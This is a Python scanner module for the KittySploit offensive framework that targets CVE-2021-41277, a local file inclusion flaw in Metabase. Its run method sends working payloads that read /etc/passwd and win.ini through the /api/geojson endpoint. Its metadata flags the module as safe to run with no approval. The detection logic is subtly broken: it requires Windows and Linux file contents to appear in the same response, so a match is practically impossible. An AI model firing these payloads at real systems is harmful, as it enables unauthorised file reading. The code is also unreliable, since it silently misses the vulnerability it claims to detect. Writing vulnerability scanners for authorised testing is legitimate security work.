#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Metabase is an open source data analytics platform."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Metabase - Local File Inclusion Detection',
        'description': 'Metabase is an open source data analytics platform. In affected versions a local file inclusion security issue has been discovered with the custom GeoJSON map (`admin->settings->maps->custom maps->add a map`) support and potential local file inclusion (including environment variables). URLs were not validated prior to being loaded.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'metabase', 'lfi', 'kev', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/metabase/metabase/security/advisories/GHSA-w73v-6p7p-fpfr',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-41277',
            'https://twitter.com/90security/status/1461923313819832324',
            'https://github.com/metabase/metabase/commit/042a36e49574c749f944e19cf80360fd3dc322f0',
            'https://github.com/pen4uin/vulnerability-research-list',
        ],
        'cve': 'CVE-2021-41277',
    }

    def run(self):
        for path in ('/api/geojson?url=file:///etc/passwd', '/api/geojson?url=file:///c://windows/win.ini'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_all = ('bit app support', 'fonts', 'extensions',)
            body_regexes = ('root:.*:0:0',)
            if (all(m in body for m in body_all)) and (any(re.search(rx, body, 0) for rx in body_regexes)):
                self.set_info(
                    severity='high',
                    reason="Metabase - Local File Inclusion detected",
                    path=path,
                )
                return True
        return False

